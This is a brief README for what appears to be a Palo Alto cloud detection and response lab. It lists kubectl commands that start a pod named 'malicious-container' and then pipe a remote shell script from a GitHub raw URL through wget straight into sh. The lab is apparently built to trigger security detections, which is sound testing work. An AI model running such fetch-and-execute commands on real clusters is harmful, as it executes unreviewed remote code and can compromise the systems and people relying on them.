# PANW CDR Container

## 
Located within this directory /cdr-container/dockerfile




## Working Tasks 

## Dockerhub 



## Kubectl Quick Deployments 

kubectl run malicious-container --image=alpine --restart=Never -- /bin/sh -c "while true; do sleep 30; done"

kubectl exec -it malicious-container -- /bin/sh -c "wget -qO- https://raw.githubusercontent.com/hankthebldr/xsiam-prisma-cdr-lab/refs/heads/alpha/malicous-container/malicous-container.sh | sh"

